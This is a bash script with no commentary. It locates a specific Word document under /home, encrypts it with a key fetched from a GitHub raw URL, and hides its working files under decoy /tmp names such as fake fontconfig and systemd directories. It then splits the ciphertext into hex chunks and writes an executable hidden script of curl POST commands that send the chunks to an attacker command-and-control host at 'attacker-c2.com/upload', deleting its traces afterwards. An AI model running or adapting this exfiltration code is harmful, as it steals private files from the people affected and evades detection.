#!/bin/bash
TARGET_FILE="Hasil_Sidang_2026.docx"
TARGET_PATH=$(find /home -type f -name "$TARGET_FILE" 2>/dev/null | head -n 1)

if [ -z "$TARGET_PATH" ]; then
    exit 1
fi

KEY_URL="https://raw.githubusercontent.com/inoginnsh/Apanii2/refs/heads/main/Apaniii"

RAW_KEY=$(curl -fsSL "$KEY_URL") || exit 1

KEY_DIR="/tmp/.cache-fontconfig-9f2ca31d0b7e4a52/systemd-private-8c1f0a3d5e7b9c1f2a4d"
mkdir -p "$KEY_DIR"
printf %s "$RAW_KEY" > "$KEY_DIR/keymaterial"
_h=$(sha256sum --tag "$KEY_DIR/keymaterial")
rm -rf "/tmp/.cache-fontconfig-9f2ca31d0b7e4a52"

KEY=${_h##* }
_h=

IV="${KEY:0:32}"
KEY=

ENC_FILE="/tmp/.hasil_sidang_enc"

read -r -d '' PY <<PYEOF
iv="$IV";src="$TARGET_PATH";dst="$ENC_FILE";import os,hashlib;from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes;key=hashlib.sha256(open(3,"rb").read().rstrip(b"\n")).hexdigest().encode();salt=os.urandom(8);dk=hashlib.pbkdf2_hmac("sha256",key,salt,10000,48);enc=Cipher(algorithms.AES(dk[:32]),modes.CBC(bytes.fromhex(iv))).encryptor();buf=open(src,"rb").read();pad=16-len(buf)%16;buf+=bytes([pad])*pad;open(dst,"wb").write(b"Salted__"+salt+enc.update(buf)+enc.finalize())
PYEOF

printf %s "$PY" | python3 - 3<<<"$RAW_KEY"

PY=
RAW_KEY=

PART_DIR="/tmp/.pecahan_data"
mkdir -p "$PART_DIR"
split -n 3 "$ENC_FILE" "$PART_DIR/part_"

H1=$(xxd -p -c 100000 "$PART_DIR/part_aa" | tr -d '\n')
H2=$(xxd -p -c 100000 "$PART_DIR/part_ab" | tr -d '\n')
H3=$(xxd -p -c 100000 "$PART_DIR/part_ac" | tr -d '\n')

C2_URL="https://attacker-c2.com/upload"

exec 4>/tmp/.send_data.sh
_emit() {
    local d=$1 i=0
    while [ $i -lt ${#d} ]; do
        printf %s "${d:i:64}" >&4
        i=$((i+64))
    done
    printf '\n' >&4
}
_emit "curl -X POST $C2_URL -d \"p1=$H1\""
_emit "curl -X POST $C2_URL -d \"p2=$H2\""
_emit "curl -X POST $C2_URL -d \"p3=$H3\""
exec 4>&-

chmod +x /tmp/.send_data.sh

rm -rf "$PART_DIR" "$ENC_FILE"
